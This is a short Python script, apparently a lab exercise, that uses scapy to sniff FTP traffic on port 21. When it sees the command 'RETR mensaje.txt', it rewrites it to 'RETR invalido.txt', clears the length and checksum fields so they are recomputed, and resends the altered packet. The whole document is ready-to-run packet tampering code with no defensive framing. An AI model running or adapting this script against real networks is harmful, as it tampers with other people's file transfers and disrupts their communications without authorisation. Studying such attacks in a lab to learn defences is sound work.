from scapy.all import *

def modificar_retr(pkt):
    if pkt.haslayer(TCP) and pkt[TCP].dport == 21 and pkt.haslayer(Raw):
        carga = pkt[Raw].load
        if b'RETR mensaje.txt' in carga:
            nuevo_payload = carga.replace(b'RETR mensaje.txt', b'RETR invalido.txt')
            
            pkt[Raw].load = nuevo_payload

            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[TCP].chksum

            send(pkt)
            print(f"Paquete modificado: {nuevo_payload}")

sniff(filter="tcp port 21", prn=modificar_retr)